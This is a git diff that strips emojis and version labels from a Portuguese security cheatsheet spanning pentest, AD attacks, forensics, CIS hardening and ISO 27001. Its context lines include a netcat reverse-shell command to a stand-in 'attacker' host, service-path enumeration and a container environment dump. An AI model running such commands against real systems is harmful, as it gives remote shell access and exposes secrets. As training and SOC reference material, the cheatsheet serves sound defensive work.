@@ -1,30 +1,27 @@
 <!--
 ╔══════════════════════════════════════════════════════════════╗
-║  Security Cheatsheet · SOC Ops v3                           ║
-║  18 seções · 500+ itens · Uso interno                       ║
+║  Security Cheatsheet                                         ║
 ╚══════════════════════════════════════════════════════════════╝
 -->
 
-# Security Cheatsheet `SOC Ops v3`
-
-> **18 seções · 500+ itens** · Uso interno · 2025
+# Security Cheatsheet
 
 ---
 
 ## Índice
 
 ```
-🔍 OSINT                   ⚡ Pentest / Hacking         🏛️ Active Directory
-🌐 Redes / Network         🚨 Incident Response          🦠 Malware Analysis
-🔬 Forense Digital         🐧 Linux Investigation        🪟 Windows Investigation
-⚙️ DevSecOps               🐋 Docker / K8s Security      🔒 AppSec / API Security
-🐧 Linux Hardening (CIS)   🪟 Windows Hardening (CIS)    🏰 AD Hardening (CIS)
-☁️ Cloud Hardening (CIS)    📋 Hardening Baselines         🛡️ ISO 27001:2022
+ OSINT                    Pentest / Hacking           Active Directory
+ Redes / Network          Incident Response           Malware Analysis
+ Forense Digital          Linux Investigation         Windows Investigation
+ DevSecOps                Docker / K8s Security       AppSec / API Security
+ Linux Hardening (CIS)    Windows Hardening (CIS)     AD Hardening (CIS)
+ Cloud Hardening (CIS)    Hardening Baselines         ISO 27001:2022
 ```
 
 ---
 
-## 🔍 OSINT
+##  OSINT
 `Open Source Intelligence · Reconhecimento passivo · 18 itens`
 
 ### Sites & Plataformas `WEB`
@@ -79,7 +76,7 @@ shodan stats --facets port "org:target"
 
 ---
 
-## ⚡ Pentest / Hacking
+##  Pentest / Hacking
 `Recon · Exploração · Pós-exploração · Serviços · 40+ itens`
 
 ### Ferramentas Hackviser `TOOLS`
@@ -168,7 +165,7 @@ wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v '\
 
 ---
 
-## 🏛️ Active Directory
+##  Active Directory
 `Ataques · Enumeração · Kerberos · Lateral Movement · 35+ itens`
 
 ### Enumeração `CMD`
@@ -243,7 +240,7 @@ Event 4769 + threshold→ Alert para Kerberoasting — muitos TGS em pouco tempo
 
 ---
 
-## 🌐 Redes / Network
+##  Redes / Network
 `Análise · Captura · Diagnóstico · Segurança · 22 itens`
 
 ### Captura e Análise `CMD`
@@ -293,7 +290,7 @@ nc -e /bin/bash attacker 4444
 
 ---
 
-## 🚨 Incident Response
+##  Incident Response
 `Triagem · Contenção · Erradicação · Recuperação · PICERL · 30 itens`
 
 ### Fases IR — PICERL `REF`
@@ -352,7 +349,7 @@ KAPE            → Kroll Artifact Parser and Extractor — triage rápida
 
 ---
 
-## 🦠 Malware Analysis
+##  Malware Analysis
 `Static · Dynamic · Sandboxes · IOCs · 20+ itens`
 
 ### Análise Estática `CMD`
@@ -402,7 +399,7 @@ binwalk         → Análise de firmware — extração de filesystems embutidos
 
 ---
 
-## 🔬 Forense Digital
+##  Forense Digital
 `Evidências · Memória · Disco · Timeline · 25+ itens`
 
 ### Forense de Memória `CMD`
@@ -461,7 +458,7 @@ vol -f memory.dmp windows.malfind | grep -v "\\\\Windows"
 
 ---
 
-## 🐧 Linux Investigation
+##  Linux Investigation
 `Análise · Logs · Processos · Persistência · 30+ itens`
 
 ### Triagem Inicial `CMD`
@@ -511,7 +508,7 @@ find /home -name ".bash_history" -exec cat {} \;
 
 ---
 
-## 🪟 Windows Investigation
+##  Windows Investigation
 `Eventos · PowerShell · DFIR · Artefatos · 28+ itens`
 
 ### Event IDs Críticos `REF`
@@ -572,7 +569,7 @@ Browser History       → %APPDATA%\...\User Data\Default\History (Chrome/Edge S
 
 ---
 
-## ⚙️ DevSecOps
+##  DevSecOps
 `CI/CD · SAST · DAST · Container Security · 20+ itens`
 
 ### Pipeline de Segurança `REF`
@@ -601,7 +598,7 @@ sealed-secrets   → Secrets encriptados para GitOps — Bitnami
 
 ---
 
-## 🐋 Docker / K8s Security
+##  Docker / K8s Security
 `Container Hardening · Runtime · RBAC · Network · 22 itens`
 
 ### Docker Hardening `CMD`
@@ -652,7 +649,7 @@ kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].env[*]}{"
 
 ---
 
-## 🔒 AppSec / API Security
+##  AppSec / API Security
 `OWASP · API Security · Ferramentas · 25+ itens`
 
 ### OWASP Top 10 (2021) `REF`
@@ -768,7 +765,7 @@ API inventory    → Manter catálogo de todas as APIs — eliminar shadow APIs
 
 ---
 
-## 🐧 Linux Hardening (CIS)
+##  Linux Hardening (CIS)
 `CIS Linux Benchmark · Ubuntu/RHEL/Debian · Configuração defensiva · 45 controles`
 
 ### 1. Filesystem & Boot `CIS L1`
@@ -889,7 +886,7 @@ ufw enable && ufw status verbose
 
 ---
 
-## 🪟 Windows Hardening (CIS)
+##  Windows Hardening (CIS)
 `CIS Windows Server 2022 / Windows 11 · GPO · Security Baseline · 50 controles`
 
 ### 1. Account Policies `CIS L1`
@@ -1016,7 +1013,7 @@ Set-MpPreference -PUAProtection Enabled
 
 ---
 
-## 🏰 AD Hardening (CIS)
+##  AD Hardening (CIS)
 `CIS AD DS · Privileged Access · Tiering Model · Delegation · 40 controles`
 
 ### 1. Políticas de Conta & Autenticação `CIS L1`
@@ -1101,7 +1098,7 @@ Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path "C:\Windows\System32\cmd
 
 ---
 
-## ☁️ Cloud Hardening (CIS)
+##  Cloud Hardening (CIS)
 `AWS · Azure · GCP · IAM · Logging · Network · Storage · 55 controles`
 
 ### AWS — IAM & Account `CIS L1`
@@ -1181,7 +1178,7 @@ aws cloudtrail start-logging --name cis-trail
 
 ---
 
-## 📋 Hardening Baselines
+##  Hardening Baselines
 `CIS vs STIG vs NIST · Quick-Win Checklist · Ferramentas de Auditoria · 35 itens`
 
 ### CIS vs STIG vs NIST — Comparativo
@@ -1244,7 +1241,7 @@ Nessus / Tenable.io → Vuln scan autenticado          — templates CIS e STIG 
 
 ---
 
-## 🛡️ ISO/IEC 27001:2022
+##  ISO/IEC 27001:2022
 `ISMS · 93 controles Annex A · 4 Temas · Certificação`
 
 ### Visão Geral
@@ -1380,5 +1377,4 @@ Organismos      → BSI, Bureau Veritas, SGS, DNV, LRQA, TÜV — acreditados IN
 
 ---
 
-*Security Cheatsheet v3 · SOC Operations · Uso interno*
-*Atualizado 2025 · 18 seções · 500+ itens*
+*Security Cheatsheet
